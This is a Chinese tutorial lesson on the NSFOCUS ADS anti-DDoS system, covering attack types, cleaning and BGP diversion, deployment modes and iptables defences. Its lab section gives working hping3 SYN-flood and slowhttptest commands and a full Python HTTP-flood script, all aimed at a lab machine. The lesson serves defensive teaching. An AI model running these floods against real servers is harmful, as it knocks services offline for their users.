# DAY 26 · 绿盟ADS抗DDoS系统——流量清洗与黑洞路由

> **绿盟科技** | 抗DDoS领域行业领导者 | ADS = Anti-DDoS System
> 学习时长：约3-4小时 | 难度：中级 | 实战环境：Kali Linux + Ubuntu Server

---

## 一、开篇概述：为什么DDoS是互联网的"心脏病"？

### 1.1 用洪水比喻理解DDoS

想象你开了一家小超市，正常情况下每天有100个顾客进店购物，你的收银员、货架、通道都能从容应对。

突然有一天，有10万个人同时涌入你的超市——但他们什么都不买，只是把通道堵死、把货架挤倒、把收银员围得水泄不通。真正想买东西的顾客根本进不来。

这就是**DDoS（分布式拒绝服务攻击）**的本质：用海量的"假流量"耗尽目标资源，让正常用户无法使用服务。

### 1.2 一组触目惊心的数字

| 年份 | 事件 | 攻击规模 |
|------|------|----------|
| 2016 | Mirai僵尸网络攻击Dyn DNS | 1.2 Tbps |
| 2018 | GitHub遭受Memcached反射放大 | 1.35 Tbps |
| 2020 | AWS Shield抵御 | 2.3 Tbps |
| 2022 | Google Cloud Armor抵御 | 46 million RPS (应用层) |

### 1.3 绿盟ADS的江湖地位

绿盟科技在中国抗DDoS市场的地位，就好比是专门做"防洪工程"的特级承包商。别人可能什么都做（防火墙、VPN、EDR...），绿盟在抗DDoS这个细分领域是公认的头部玩家。

**为什么选ADS？**
- 电信、联通、移动三大运营商骨干网大量部署
- 金融、政务、游戏行业市占率第一
- 从检测到清洗到溯源的完整闭环

### 1.4 今日学习地图

```
DDoS攻击分类 ──→ ADS三层防护架构 ──→ 三种部署模式
     │                  │                  │
     ├─ SYN Flood       ├─ 检测层          ├─ 串联部署
     ├─ UDP Flood       ├─ 清洗层          ├─ 旁路部署
     ├─ HTTP/CC         ├─ 溯源层          └─ 云清洗混合
     └─ DNS/NTP放大     └─ 管理平台
                              │
                        实操实验：LOIC + Hping3 + iptables
```

---

## 二、DDoS攻击深度解析：知彼知己

### 2.1 按OSI模型分层理解DDoS

DDoS攻击可以发生在网络的不同层级。用寄快递来类比：

| OSI层 | 协议 | 攻击类型 | 类比 |
|-------|------|---------|------|
| L3 网络层 | IP/ICMP | ICMP Flood、IP分片攻击 | 伪造寄件人地址，大量空包裹轰炸 |
| L4 传输层 | TCP/UDP | SYN Flood、UDP Flood | 不停地握手但不完成，占着柜台不走 |
| L7 应用层 | HTTP/DNS | HTTP Flood、CC攻击、Slowloris | 假装要买东西，不停地问问题但不下单 |

### 2.2 网络层/传输层攻击详解

#### SYN Flood——最经典的攻击

**正常TCP三次握手：**
```
客户端                      服务器
  │──────SYN──────→│  "你好，我想建立连接"
  │←────SYN-ACK────│  "收到，请确认"
  │──────ACK──────→│  "确认，连接建立"
```

**SYN Flood攻击：**
```
攻击者(伪造IP)              服务器
  │──────SYN──────→│  收到，分配内存，等待ACK...
  │──────SYN──────→│  又收到，又分配内存，又等...
  │──────SYN──────→│  再收到，再分配内存，再等...
  │   (永远不回复ACK)  │  半连接队列满 → 拒绝新连接！
```

**关键数据：**
- Linux默认半连接队列大小：256-1024
- 每个半连接占用内存：约256字节
- 1万个SYN包就足以打垮默认配置的服务器

#### UDP Flood——无连接的洪水

UDP是无连接协议，不需要握手，攻击者可以：
- 直接发送海量UDP包占满带宽
- 利用反射放大：发送小请求，让第三方服务器回复大响应

**常见反射放大攻击：**

| 协议 | 端口 | 放大倍数 |
|------|------|---------|
| NTP monlist | 123 | 556倍 |
| DNS ANY查询 | 53 | 28-54倍 |
| Memcached | 11211 | 10,000-51,000倍 |
| CLDAP | 389 | 46-55倍 |
| SSDP | 1900 | 30倍 |

**理解放大倍数：** 攻击者发送1字节的请求，服务器可能回复51,000字节。相当于你花1块钱，让受害者收到51,000块的"账单"。

### 2.3 应用层攻击详解

#### HTTP Flood / CC攻击

"CC"来自"Challenge Collapsar"工具，是典型的应用层DDoS。特点是：

- **流量不大**，看起来像是正常用户
- **消耗服务器资源**：CPU、内存、数据库连接
- **难以区分**：每个请求都是合法的HTTP请求

**常见CC攻击手法：**

```
1. 随机URL攻击：大量请求不存在的页面 → 消耗Web服务器资源
2. 数据库密集型攻击：反复请求搜索接口 → 数据库CPU飙升
3. 登录爆破式攻击：大量尝试登录 → 锁死认证模块
4. 文件下载攻击：反复下载大文件 → 耗尽出口带宽
```

#### Slowloris / Slow HTTP攻击

这种攻击极为阴险——它不发送大量请求，而是：

```
客户端: "GET / HTTP/1.1"
客户端: "Host: target.com"
客户端: (等了30秒...)
客户端: "User-Agent: Mozilla"
客户端: (又等了30秒...)
客户端: "Accept: */*"
...
```

每30秒发送一个HTTP头字段，但永远不发结束标记。服务器一直保持连接打开，最终耗尽所有连接槽。

**一个攻击者用一台笔记本，就能打垮配置不佳的Apache服务器。**

---

## 三、绿盟ADS核心架构：检测→清洗→溯源三层防护

### 3.1 ADS整体架构图

```
                      互联网
                        │
                        ▼
              ┌─────────────────┐
              │   ① 检测层       │  ← NetFlow/sFlow/镜像流量分析
              │  异常流量识别    │    基线学习 + 行为分析
              └────────┬────────┘
                       │ 发现攻击
                       ▼
              ┌─────────────────┐
              │   ② 清洗层       │  ← BGP引流 + 流量清洗中心
              │  恶意流量过滤    │    DPI深度包检测 + 特征匹配
              └────────┬────────┘
                       │ 清洗后回注
                       ▼
              ┌─────────────────┐
              │   ③ 溯源层       │  ← IP溯源 + 僵尸网络追踪
              │  攻击源定位      │    取证分析 + 法律举证
              └─────────────────┘
                       │
                       ▼
                 正常业务流量 → 目标服务器
```

### 3.2 第一层：检测——如何发现"不正常"？

#### 基线学习（7天观察期）

ADS部署后前7天，会进入"学习模式"：

```
学习内容：
├── 正常流量模型：每个时段(小时)的流量基线
│   09:00-10:00: 通常 500Mbps
│   14:00-15:00: 通常 800Mbps（高峰期）
│   03:00-04:00: 通常 50Mbps（低峰期）
│
├── 协议分布基线：TCP/UDP/ICMP/HTTP的比例
│   正常：TCP 70% / UDP 20% / ICMP 5% / 其他 5%
│
├── 新建连接速率：每秒新建连接数
│   正常：高峰期 5000 cps
│
└── 应用层特征：URL访问频率、请求方法分布
    正常：GET 85% / POST 15%
```

#### 异常检测算法

**1. 阈值检测（最简单）**
```
if current_traffic > baseline × 3:
    告警！可能发生攻击！
```

**2. 统计检测（更智能）**
使用滑动窗口 + 标准差判断：
```python
# 伪代码：3-sigma原则
mean = 过去1小时流量平均值
std = 过去1小时流量标准差
if current_value > mean + 3 * std:
    告警！异常流量！
```

**3. 行为检测（最智能）**
- 熵值分析：正常流量源IP分布均匀，攻击时来源单一或伪造
- 协议异常：突然出现大量特定协议的流量
- 模式匹配：已知攻击工具的流量特征

#### ADS检测层的核心优势

绿盟ADS的检测不是简单地"超过阈值就报警"，而是：

```
多维关联分析：
├── 时间维度：持续多久？是否周期性？
├── 空间维度：来源IP分布？地理位置？
├── 协议维度：哪层协议？什么类型？
├── 行为维度：是否扫描？是否爆破？
└── 负载维度：payload是否有攻击特征？
```

### 3.3 第二层：清洗——如何"去伪存真"？

#### BGP引流技术

当检测到攻击，ADS通过BGP协议将流量"牵引"到清洗中心：

```
正常路由：用户 → 直接 → 目标服务器
        ↓
攻击时路由：用户 → BGP通告 → 清洗中心 → 正常流量回注 → 目标服务器
```

BGP引流原理：
```
1. ADS清洗中心向骨干路由器宣告目标IP的BGP路由
2. 由于更具体的路由（/32）优先于一般路由
3. 所有发往目标IP的流量先经过清洗中心
4. 清洗完成后，正常流量通过GRE隧道回注给目标
```

#### 清洗技术栈

**L3/L4层清洗：**

| 技术 | 原理 | 对付什么攻击 |
|------|------|-------------|
| 源IP信誉库 | 黑名单直接丢弃 | 已知僵尸网络 |
| TCP代理/SYN Cookie | 代替服务器完成三次握手 | SYN Flood |
| 速率限制(Rate Limit) | 同源IP限速 | UDP Flood |
| 协议合规检查 | 丢弃不符合RFC的畸形包 | 协议攻击 |
| 地理位置过滤 | 丢弃特定国家/地区流量 | 区域性攻击 |
| TTL/Hop检查 | 丢弃明显伪造的包 | IP欺骗 |

**SYN Cookie原理详解：**

这是防御SYN Flood的核心技术：

```
传统方式：
  客户端SYN → 服务器分配内存保存半连接 → 等待ACK → 内存耗尽

SYN Cookie方式：
  客户端SYN → 服务器不分配内存，而是：
    1. 将连接信息(IP/端口/MSS)计算出一个hash值
    2. 把这个hash值作为SYN-ACK的序列号发回去
    3. 收到客户端的ACK时，验证序列号是否匹配
    4. 匹配成功才分配内存建立连接
  
  好处：完全不消耗内存来保存半连接！
```

Linux内核启用SYN Cookie：
```bash
# 查看当前设置
sysctl net.ipv4.tcp_syncookies
# 启用SYN Cookie
sysctl -w net.ipv4.tcp_syncookies=1
# 永久生效
echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.conf
```

**L7层清洗：**

| 技术 | 原理 | 对付什么攻击 |
|------|------|-------------|
| HTTP挑战(302重定向) | 浏览器能跟随重定向，脚本不能 | 简单HTTP Flood |
| JavaScript挑战 | 要求执行JS，验证是真实浏览器 | 脚本型CC攻击 |
| 验证码(CAPTCHA) | 人机验证 | 复杂CC攻击 |
| 请求速率限制 | 单IP每秒最多N个请求 | 一般CC攻击 |
| URL访问频率分析 | 热门URL突然暴增 | 定向CC攻击 |
| User-Agent检查 | 过滤明显的自动化工具 | 脚本攻击 |

#### 回注技术

清洗完的正常流量如何还给目标服务器？

```
方案1：二层回注（同网段）
  ADS清洗设备 → 直接修改目的MAC → 交换机转发 → 目标服务器
  
方案2：三层回注（跨网段）
  ADS清洗设备 → GRE隧道封装 → 路由器 → 目标服务器

方案3：策略路由回注
  ADS清洗设备 → 标记正常流量 → 策略路由 → 目标服务器
```

### 3.4 第三层：溯源——谁在攻击我？

#### 溯源的技术手段

**1. IP溯源（基础）**
- 分析攻击流量的源IP
- 过滤掉明显伪造的IP（如保留地址、未分配地址）
- 关联威胁情报库，识别已知僵尸网络

**2. 僵尸网络追踪（进阶）**
- 分析C&C（命令与控制）通信特征
- 识别僵尸网络的家族（Mirai、Gafgyt、Moobot...）
- 关联样本hash和恶意域名

**3. 攻击工具指纹识别**
```
攻击工具        特征
LOIC            固定User-Agent + 特定HTTP参数
HOIC            Booster文件特征 + 多URL并发
Hping3          特定TCP窗口大小 + IP ID规律
Mirai           特定TCP选项字段 + 固定payload
```

**4. 法律取证**
- 生成符合司法要求的攻击日志
- 保留原始流量pcap包作为证据
- 提供攻击时间线、流量曲线图

---

## 四、ADS三种部署架构详解

### 4.1 串联部署（Inline）

```
     互联网
        │
        ▼
   ┌─────────┐
   │  路由器   │
   └────┬────┘
        │
        ▼
   ┌─────────┐
   │   ADS   │  ← 所有流量必须经过ADS
   └────┬────┘
        │
        ▼
   ┌─────────┐
   │ 交换机   │
   └────┬────┘
        │
        ▼
   目标服务器
```

**优点：**
- 所有流量经过，可以实时阻断
- 检测和防护一体化，延迟最低
- 配置简单，不需要BGP等复杂协议

**缺点：**
- ADS成为单点故障（需要HA双机热备）
- ADS性能成为瓶颈
- 正常流量也经过ADS，增加延迟
- 不适合超大流量场景（>100Gbps）

**适用场景：** 中小企业、固定带宽场景、对延迟敏感的业务

### 4.2 旁路部署（Out-of-Path / BGP引流）

```
     互联网
        │
        ▼
   ┌─────────┐
   │ 骨干路由  │
   └────┬────┘
        │ (正常时)
        ▼
   ┌─────────┐
   │ 目标网络  │
   └─────────┘

   ════ 检测到攻击 ════

     互联网
        │
        ▼
   ┌─────────┐
   │ 骨干路由  │ ← BGP路由被ADS牵引
   └────┬────┘
        │ (攻击时)
        ▼
   ┌─────────┐
   │ ADS清洗  │ → 清洗恶意流量
   └────┬────┘
        │ (正常流量GRE回注)
        ▼
   ┌─────────┐
   │ 目标网络  │
   └─────────┘
```

**优点：**
- ADS不成为瓶颈，可以按需扩容
- 正常时不影响任何流量
- 支持超大规模清洗（Tbps级别）
- 运营商级部署的标准方案

**缺点：**
- 配置复杂，需要BGP协议支持
- 攻击检测到引流有延迟（秒级）
- 需要额外的检测设备（NetFlow分析）
- 回注路径需要精心设计

**适用场景：** 大型企业、IDC、运营商、金融行业

### 4.3 云清洗混合部署（Hybrid / Cloud Scrubbing）

```
            互联网
               │
               ▼
        ┌──────────────┐
        │  云清洗中心    │  ← 第一道防线：清洗超大流量
        │ (Anycast网络) │
        └──────┬───────┘
               │ (清洗后)
               ▼
        ┌──────────────┐
        │  本地ADS设备  │  ← 第二道防线：精细清洗 + 应用层
        └──────┬───────┘
               │ (最终清洗)
               ▼
           目标服务器
```

**工作原理：**
1. 本地ADS检测到攻击超过本地带宽
2. 自动触发云端清洗：修改DNS解析到云清洗IP
3. 云清洗中心吸收并清洗大流量攻击（Anycast全球分散）
4. 清洗后的流量通过专线或GRE隧道送回本地
5. 本地ADS进行二次精细清洗（应用层攻击）

**优点：**
- 理论上无限扩展能力
- 本地设备不成为瓶颈
- 应对超大规模攻击
- 节省本地带宽成本

**缺点：**
- 依赖云服务商，有成本
- 延迟增加（流量绕到云端再回来）
- 配置和维护复杂
- DNS切换有传播延迟

**适用场景：** 高价值目标、游戏行业、金融行业、易受大流量攻击的业务

### 4.4 三种部署架构对比总结

| 维度 | 串联部署 | 旁路部署 | 云清洗混合 |
|------|---------|---------|-----------|
| 部署复杂度 | 低 | 中 | 高 |
| 防护能力 | 中等(Gbps) | 大(Tbps) | 超大(Tbps+) |
| 延迟影响 | 持续存在 | 仅攻击时 | 攻击时有 |
| 单点故障风险 | 有(需HA) | 无 | 无 |
| 成本 | 低 | 中 | 高(含云服务费) |
| 适用规模 | 中小企业 | 大型企业/IDC | 高价值目标 |
| 代表场景 | 公司官网 | 银行/电商 | 游戏/直播 |

---

## 五、分层防护策略：纵深防御体系

### 5.1 为什么需要分层防护？

单一技术无法应对所有攻击。就像银行安保：
- 大堂保安（L3/L4防护）：拦住明显可疑的人
- 柜台防弹玻璃（L7防护）：挡住近距离攻击
- 报警系统（监控告警）：发现异常立即响应

### 5.2 ADS分层防护模型

```
第一层：网络层防护 (L3/L4)
├── ACL/IP黑名单过滤
├── SYN Cookie/代理
├── UDP速率限制
├── ICMP限速
└── 协议异常检测
         │
         ▼ 通过L3/L4检查
第二层：传输层深度防护 (L4)
├── TCP状态检测(Stateful)
├── 连接速率限制
├── 异常握手行为检测
└── 会话追踪与信誉评估
         │
         ▼ 通过L4检查
第三层：应用层防护 (L7)
├── HTTP协议合规检查
├── URL访问频率控制
├── 人机验证(JS挑战/验证码)
├── 请求方法限制
└── 业务逻辑异常检测
         │
         ▼ 通过全部检查 → 正常用户
```

### 5.3 防护策略配置示例（伪配置）

```
# ADS防护策略配置示例
policy "web-server-protection" {
    
    # === L3/L4层规则 ===
    rule "syn-flood" {
        protocol = "TCP"
        flags = "SYN"
        threshold = 100000  # 每秒SYN包超过10万
        action = "syn-cookie"  # 启用SYN Cookie
    }
    
    rule "udp-flood" {
        protocol = "UDP"
        threshold = 50000000  # 50Mbps
        action = "rate-limit:10000"  # 限制到10Mbps
    }
    
    rule "icmp-limit" {
        protocol = "ICMP"
        threshold = 1000  # 每秒1000个
        action = "drop"
    }
    
    # === L7层规则 ===
    rule "cc-attack" {
        protocol = "HTTP"
        threshold = 500  # 单IP每秒500请求
        action = "js-challenge"  # JS挑战
    }
    
    rule "slow-attack" {
        protocol = "HTTP"
        timeout = 10  # 请求头超时10秒
        action = "drop"
    }
    
    rule "hot-url" {
        url_pattern = "/api/search*"
        threshold = 100  # 单IP每秒100次搜索
        action = "captcha"  # 弹出验证码
    }
    
    # === 白名单 ===
    whitelist {
        ip_range = ["10.0.0.0/8", "192.168.0.0/16"]
        url = ["/health", "/status"]
    }
}
```

---

## 六、实操实验：动手模拟DDoS攻防

### 6.1 实验环境准备

**拓扑结构：**
```
Kali攻击机(192.168.56.101) ──→ Ubuntu靶机(192.168.56.102)
```

**环境搭建步骤：**

```bash
# === 在Ubuntu靶机上执行 ===

# 1. 安装Web服务器作为攻击目标
sudo apt update
sudo apt install -y apache2 nginx

# 2. 创建一个简单的测试页面
sudo tee /var/www/html/index.html << 'EOF'
<html>
<head><title>DDoS攻防测试靶机</title></head>
<body>
<h1>这台服务器正在被测试DDoS攻击</h1>
<p>当前时间: <span id="time"></span></p>
<script>
setInterval(() => {
    document.getElementById('time').innerText = new Date().toLocaleString();
}, 1000);
</script>
</body>
</html>
EOF

# 3. 启动Apache（作为默认Web服务）
sudo systemctl start apache2
sudo systemctl enable apache2

# 4. 安装监控工具
sudo apt install -y htop iftop nload tcpdump

# 5. 确认服务运行
curl http://localhost
# 应该能看到HTML页面
```

```bash
# === 在Kali攻击机上执行 ===

# 1. 确认网络连通性
ping 192.168.56.102

# 2. 确认Web服务可达
curl http://192.168.56.102

# 3. 安装攻击工具
sudo apt update
sudo apt install -y hping3 slowhttptest
# LOIC在Kali中可能需要手动安装
```

### 6.2 实验一：使用Hping3模拟SYN Flood

**第一步：观察正常连接**

在Ubuntu靶机上，先看看正常的连接状态：
```bash
# 查看当前TCP连接统计
ss -s
# 查看半连接队列
ss -tan state syn-recv | wc -l
# 持续监控
watch -n 1 'ss -tan state syn-recv | wc -l'
```

**第二步：从Kali发起SYN Flood攻击**

```bash
# === 在Kali上执行 ===

# Hping3 SYN Flood基础命令
# --flood: 疯狂发包模式
# -S: SYN标志位
# -p 80: 目标端口80
# --rand-source: 随机源IP（伪造IP）
sudo hping3 -S --flood -p 80 --rand-source 192.168.56.102

# 如果不想用随机IP（某些环境下不工作），可以用固定源IP
sudo hping3 -S --flood -p 80 192.168.56.102

# 指定发送速率（每秒包数）
sudo hping3 -S -p 80 --faster 192.168.56.102
# --faster 每秒100包
# --fast 每秒10包
# --interval u1000 每1毫秒1包 = 1000 pps
```

**第三步：在Ubuntu靶机上观察攻击效果**

```bash
# 查看半连接数量（会急剧增加）
ss -tan state syn-recv | wc -l

# 查看CPU使用率
top

# 查看网络流量
nload
# 或
iftop -i eth0

# 用tcpdump抓包观察
sudo tcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-syn != 0 and port 80' -c 50
```

你会看到大量SYN包涌入，半连接队列迅速填满。

**第四步：停止攻击**
```bash
# 在Kali上按 Ctrl+C 停止hping3
```

### 6.3 实验二：使用iptables防御SYN Flood

```bash
# === 在Ubuntu靶机上执行 ===

# 1. 查看当前iptables规则
sudo iptables -L -n -v

# 2. 限制单IP的SYN包速率
# 每个源IP每秒最多10个SYN包，超过则丢弃
sudo iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# 解释：
# --limit 10/s: 长期平均速率，每秒10个
# --limit-burst 20: 突发允许20个（token bucket容量）

# 3. 启用SYN Cookie
sudo sysctl -w net.ipv4.tcp_syncookies=1

# 4. 减小SYN_RECV超时时间
sudo sysctl -w net.ipv4.tcp_synack_retries=1
# 默认5次，共约180秒；改为1次，约9秒

# 5. 增大半连接队列（SYN backlog）
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096

# 6. 启用tcp_tw_reuse（快速回收TIME_WAIT连接）
sudo sysctl -w net.ipv4.tcp_tw_reuse=1

# 7. 查看所有相关内核参数
sysctl -a | grep -E "syncookies|syn_backlog|synack_retries|tw_reuse"
```

**验证防御效果：**
```bash
# 1. 先应用iptables规则
# 2. 从Kali再次发起SYN Flood
# 3. 观察半连接队列是否受控
ss -tan state syn-recv | wc -l
# 4. 检查iptables计数器
sudo iptables -L -n -v | grep -E "syn|DROP"
```

### 6.4 实验三：使用SlowHTTPTest模拟慢速攻击

```bash
# === 在Kali上执行 ===

# Slowloris模式：慢速发送HTTP头
slowhttptest -c 1000 -H -g -o slowloris_report \
  -i 10 -r 200 -t GET -u http://192.168.56.102 \
  -x 24 -p 3

# 参数解释：
# -c 1000: 建立1000个连接
# -H: Slowloris模式
# -i 10: 每10秒发送一个header
# -r 200: 每秒建立200个新连接
# -u: 目标URL
# -x 24: 每个连接最多24个header行

# Slow Body模式：慢速发送POST请求体
slowhttptest -c 1000 -B -g -o slowbody_report \
  -i 110 -r 200 -s 8192 -t FAKEVERB \
  -u http://192.168.56.102 -x 10 -p 3

# Slow Read模式：慢速读取响应
slowhttptest -c 1000 -X -g -o slowread_report \
  -r 200 -w 512 -y 1024 -n 5 -z 32 \
  -k 3 -u http://192.168.56.102 -p 3
```

**在靶机上观察：**
```bash
# 查看Apache连接数
sudo apache2ctl status
# 或
ss -tan state established | grep :80 | wc -l

# 查看Apache进程数
ps aux | grep apache | wc -l
```

### 6.5 实验四：使用LOIC模拟CC攻击

```bash
# === 在Kali上执行 ===

# 如果LOIC没有预装，用Python模拟CC攻击
# 创建简单的CC攻击脚本

cat > cc_attack.py << 'PYEOF'
#!/usr/bin/env python3
"""简易CC攻击模拟脚本 - 仅供学习使用"""

import requests
import threading
import time
import random

target_url = "http://192.168.56.102/"
num_threads = 50
duration = 30  # 攻击持续秒数

# 模拟不同的User-Agent
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

def attack():
    """单个攻击线程的工作函数"""
    end_time = time.time() + duration
    session = requests.Session()
    
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Connection": "keep-alive",
            }
            # 随机请求不同URL
            urls = [
                target_url,
                target_url + "?page=" + str(random.randint(1, 1000)),
                target_url + "?search=" + str(random.randint(1, 99999)),
            ]
            session.get(random.choice(urls), headers=headers, timeout=3)
        except:
            pass

# 启动攻击线程
threads = []
print(f"[*] 启动{num_threads}个攻击线程，持续{duration}秒...")
for i in range(num_threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()
    threads.append(t)

# 等待所有线程完成
for t in threads:
    t.join()

print("[*] 攻击结束")
PYEOF

chmod +x cc_attack.py
python3 cc_attack.py
```

### 6.6 实验五：实现简易iptables Rate-Limit防护

```bash
# === 在Ubuntu靶机上执行 ===

# 完整防护脚本
cat > ddos_defense.sh << 'SHEOF'
#!/bin/bash
# 简易DDoS防护脚本 - iptables版

echo "[*] 开始配置iptables防护规则..."

# 1. 清空现有规则（谨慎！生产环境不要这样）
# iptables -F

# 2. 默认策略
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# 3. SYN Flood防护
echo "[*] 配置SYN Flood防护..."
# 限制每个源IP的SYN包速率
iptables -A INPUT -p tcp --syn -m limit --limit 20/s --limit-burst 30 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# 4. 限制每个IP的并发连接数
echo "[*] 限制并发连接数..."
iptables -A INPUT -p tcp --dport 80 -m connlimit \
  --connlimit-above 50 --connlimit-mask 32 -j DROP

# 5. 限制每个IP的新建连接速率
echo "[*] 限制新建连接速率..."
iptables -A INPUT -p tcp --dport 80 -m state --state NEW \
  -m limit --limit 100/s --limit-burst 150 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j DROP

# 6. ICMP限速
echo "[*] 配置ICMP限速..."
iptables -A INPUT -p icmp -m limit --limit 1/s --limit-burst 5 -j ACCEPT
iptables -A INPUT -p icmp -j DROP

# 7. 禁止端口扫描
echo "[*] 配置端口扫描防护..."
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP

# 8. 启用SYN Cookie
echo "[*] 启用内核SYN Cookie..."
sysctl -w net.ipv4.tcp_syncookies=1

echo "[*] 防护规则配置完成！"
echo ""
echo "当前规则："
iptables -L -n -v | grep -E "syn|connlimit|icmp|ALL"
SHEOF

chmod +x ddos_defense.sh
sudo ./ddos_defense.sh

# 查看所有规则
sudo iptables -L -n -v --line-numbers

# 清除规则（实验后恢复）
# sudo iptables -F
```

---

## 七、DDoS攻击识别与应急响应

### 7.1 如何判断正在遭受DDoS攻击？

**系统层面：**

```bash
# 1. 检查网络流量
nload          # 实时带宽
iftop -i eth0  # 按连接的流量

# 2. 检查连接状态
ss -s          # 连接统计
ss -tan        # 所有TCP连接
netstat -an | grep SYN_RECV | wc -l  # 半连接数

# 3. 检查Web服务器
tail -f /var/log/apache2/access.log  # 访问日志
# 观察：是否有同一IP大量请求？是否有大量404？

# 4. 检查系统资源
top            # CPU使用率
free -h        # 内存
df -h          # 磁盘

# 5. 按IP统计连接数（找出攻击源）
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head -20
```

**流量特征分析：**

```bash
# 用tcpdump抓包分析
sudo tcpdump -i eth0 -nn -c 1000 -w attack_sample.pcap

# 用capinfos查看pcap基本信息
capinfos attack_sample.pcap

# 用tshark分析
# 统计源IP
tshark -r attack_sample.pcap -T fields -e ip.src | sort | uniq -c | sort -nr | head

# 统计协议分布
tshark -r attack_sample.pcap -T fields -e ip.proto | sort | uniq -c | sort -nr

# 统计目标端口
tshark -r attack_sample.pcap -T fields -e tcp.dstport | sort | uniq -c | sort -nr | head
```

### 7.2 应急响应流程

```
Phase 1: 确认 (0-5分钟)
├── 确认是否为真实攻击（非业务高峰）
├── 判断攻击类型（SYN/UDP/HTTP/CC）
├── 评估攻击规模（带宽/pps）
└── 通知相关团队

Phase 2: 缓解 (5-15分钟)
├── 启用ADS防护策略（如已部署）
├── 手动启用iptables紧急规则
├── 联系运营商进行上游黑洞路由（最后手段）
├── 如果使用CDN，切换为"Under Attack"模式
└── 启用验证码或JS挑战

Phase 3: 分析 (15-60分钟)
├── 保留攻击流量样本(pcap)
├── 分析攻击特征（payload模式、工具指纹）
├── 提取攻击源IP列表
└── 关联威胁情报

Phase 4: 恢复 (攻击结束后)
├── 逐步恢复防护策略到正常水平
├── 撰写攻击分析报告
├── 更新防护规则和黑名单
└── 复盘：为什么能打进来？如何改进？
```

---

## 八、绿盟ADS vs 竞品对比

### 8.1 国内抗DDoS产品对比

| 维度 | 绿盟ADS | 华为Anti-DDoS | 阿里云DDoS高防 | 腾讯云DDoS防护 |
|------|---------|-------------|--------------|--------------|
| 部署方式 | 硬件+软件+云 | 硬件+云 | 云原生 | 云原生 |
| 防护层级 | L3-L7全覆盖 | L3-L7 | L3-L7 | L3-L7 |
| 清洗容量 | 硬件:T级别 | 硬件:T级别 | 云:无上限 | 云:无上限 |
| BGP引流 | 支持 | 支持 | Anycast | Anycast |
| 溯源能力 | 强(专业) | 中 | 弱 | 中 |
| 运营商合作 | 深(三大运营商) | 深 | 中 | 中 |
| 适合场景 | 自建清洗中心 | 运营商/大型企业 | 中小企业上云 | 腾讯生态 |
| 核心优势 | 专项最强，经验丰富 | 网络设备生态 | 阿里生态整合 | 腾讯生态整合 |

### 8.2 绿盟ADS的核心竞争力

1. **行业经验**：2000年起做抗DDoS，20+年积累
2. **运营商关系**：电信、联通、移动骨干网深度部署
3. **专项专注**：不像华为什么都做，ADS就做DDoS一件事
4. **信创支持**：全面适配国产化环境
5. **实战验证**：多次国家级重大活动保障

---

## 九、验收练习

### 9.1 基础题

1. **DDoS攻击可以分为哪两大类？各举两个例子。**
   
2. **SYN Flood的攻击原理是什么？为什么能打垮服务器？**
   
3. **ADS的三层防护架构是什么？每层的核心功能是什么？**
   
4. **串联部署和旁路部署各有什么优缺点？**

5. **什么是BGP引流？它在抗DDoS中起什么作用？**

### 9.2 进阶题

6. **SYN Cookie是如何在不消耗服务器内存的情况下防御SYN Flood的？**

7. **反射放大攻击的原理是什么？为什么Memcached能放大5万倍？**

8. **如果一台Web服务器被CC攻击，你应该采取哪些步骤？**

9. **为什么说"云清洗+本地ADS"的混合方案是当前最优解？**

10. **绿盟ADS相比其他厂商的核心优势是什么？**

### 9.3 实操题

11. **使用Hping3发起一次SYN Flood攻击，并用iptables防御。记录攻击前后的服务器状态变化。**

12. **编写一个Python脚本，分析pcap文件中的DDoS攻击特征（如源IP分布、包大小分布、协议分布）。**

13. **使用SlowHTTPTest测试Apache服务器的抗慢速攻击能力，并思考如何通过配置Apache来防御。**

---

## 十、知识扩展

### 10.1 现代DDoS攻击趋势

**1. 脉冲波攻击（Pulse Wave）**
- 短时间内极高流量，然后消失，过一会又来
- 目的：绕过基于平均值的检测系统
- 防御：需要秒级甚至毫秒级的检测响应

**2. 地毯式轰炸（Carpet Bombing）**
- 不是攻击一个IP，而是攻击整个IP段
- 目的：绕过单IP防护，瘫痪整个网络
- 防御：需要全网级别的清洗能力

**3. IoT僵尸网络**
- 利用物联网设备（摄像头、路由器）组成僵尸网络
- Mirai及其变种（Satori、Okiru、Masuta）
- 特点：数量巨大、分布广泛、难以溯源

**4. 应用层混合攻击**
- 同时使用多种应用层攻击手段
- 模拟真实用户行为，难以区分
- 需要AI/ML辅助检测

### 10.2 开源抗DDoS方案

| 工具 | 类型 | 适用场景 |
|------|------|---------|
| iptables/nftables | 内核防火墙 | 小规模防护 |
| ModSecurity + Nginx | WAF | Web应用防护 |
| FastNetMon | DDoS检测 | 流量分析 |
| BIRD | BGP路由 | BGP引流 |
| Coraza WAF | WAF | Go语言WAF |
| Crowdsec | 入侵防护 | 社区威胁情报 |

### 10.3 推荐阅读

- RFC 4987: TCP SYN Flooding Attacks and Common Mitigations
- 绿盟科技《2023年DDoS攻击态势报告》
- OWASP DDoS Prevention Cheat Sheet
- NIST SP 800-54: Border Gateway Protocol Security

### 10.4 学习路线图（DDoS专项）

```
入门 → 理解DDoS攻击原理 → 掌握基础防御(iptables/SYN Cookie)
  │
进阶 → 学习ADS产品 → 掌握三种部署架构 → 能设计防护方案
  │
高级 → BGP引流技术 → 清洗算法设计 → 大规模防护架构
  │
专家 → 攻击溯源 → 僵尸网络追踪 → 威胁情报整合
```

---

## 十一、常见问题解答 (FAQ)

**Q1: DDoS和DoS有什么区别？**
